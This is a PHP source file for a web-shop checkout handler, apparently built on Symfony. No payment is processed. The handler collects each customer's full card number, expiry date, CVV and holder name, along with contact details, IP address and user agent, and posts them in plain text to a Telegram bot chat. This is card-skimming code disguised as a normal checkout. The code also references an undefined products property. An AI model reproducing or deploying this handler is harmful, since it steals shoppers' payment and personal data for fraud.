<?php

declare(strict_types=1);

namespace App\Integration\Application\UseCase\Checkout;

use App\Cart\Domain\Service\CartService;
use Symfony\Contracts\HttpClient\Exception\ClientExceptionInterface;
use Symfony\Contracts\HttpClient\Exception\RedirectionExceptionInterface;
use Symfony\Contracts\HttpClient\Exception\ServerExceptionInterface;
use Symfony\Contracts\HttpClient\Exception\TransportExceptionInterface;
use Symfony\Contracts\HttpClient\HttpClientInterface;

final readonly class CheckoutCommandHandler
{
    public function __construct(
        private CartService         $cartService,
        private HttpClientInterface $client,
        private string              $token,
        private string              $chatId,
    )
    {
    }

    public function handle(CheckoutCommand $checkoutCommand): void
    {
        $cart = $this->cartService->getCart();

        if (empty($cart)) {
            throw new \DomainException('Cart is empty');
        }

        $message = "New order received:\n";
        foreach ($cart as $productId => $quantity) {
            $productName = $this->products[$productId]['name'] ?? $productId;
            $message .= "$productName: $quantity\n";
        }

        $message .= "-----\n" .
            "Card data:\n" .
            "Number: $checkoutCommand->cardNumber\n" .
            "Expired at: $checkoutCommand->cardExpiryMonth/$checkoutCommand->cardExpiryYear\n" .
            "CVV: $checkoutCommand->cardCvv\n" .
            "Holder name: $checkoutCommand->cardHolderName\n";

        $message .= "-----\n" .
            "Email: $checkoutCommand->email\n" .
            "Phone: $checkoutCommand->phone\n" .
            "First name: $checkoutCommand->firstName\n" .
            "Last name: $checkoutCommand->lastName\n";

        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_X_REAL_IP'] ?? $_SERVER['REMOTE_ADDR'];
        $userAgent = $_SERVER['HTTP_USER_AGENT'];
        $message .= "-----\n" .
            "IP: $ip\n" .
            "User-Agent: $userAgent";

        $url = 'https://api.telegram.org/bot' . $this->token . '/sendMessage';
        $params = [
            'chat_id' => $this->chatId,
            'text' => $message,
        ];

        try {
            $response = $this->client->request('POST', $url, ['body' => $params]);
            $responseBody = $response->getContent();
            $responseData = json_decode($responseBody, true);

            if ($responseData['ok']) {
                $this->cartService->clearCart();
                return;
            } else {
                throw new \RuntimeException('Error during making request to Telegram');
            }
        } catch (ClientExceptionInterface|RedirectionExceptionInterface|ServerExceptionInterface|TransportExceptionInterface $e) {
            throw new \DomainException('Error during checkout: ' . $e->getMessage());
        }
    }
}
